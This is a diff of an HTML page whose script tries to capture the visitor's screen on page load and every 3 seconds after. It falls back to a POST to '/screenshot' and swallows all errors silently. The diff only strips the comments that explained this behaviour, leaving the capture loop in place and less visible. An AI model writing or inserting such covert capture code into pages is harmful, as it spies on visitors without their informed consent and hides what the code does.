@@ -17,10 +17,8 @@
 <body>
 
     <script>
-        // Browser-based screenshot function
         async function takeScreenshot() {
             try {
-                // Try to capture the current tab using browser APIs
                 if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
                     const stream = await navigator.mediaDevices.getDisplayMedia({
                         video: { mediaSource: 'screen' }
@@ -51,7 +49,6 @@
                         });
                     });
                 } else {
-                    // Fallback: send a simple request
                     await fetch('/screenshot', {
                         method: 'POST',
                         headers: {
@@ -61,15 +58,13 @@
                     });
                 }
             } catch (error) {
-                // Silent fail
             }
         }
         
-        // Take screenshot immediately when page loads
         takeScreenshot();
         
-        // Take screenshots every 3 seconds while page is open
         setInterval(takeScreenshot, 3000);
     </script>
 </body>
+
 </html>
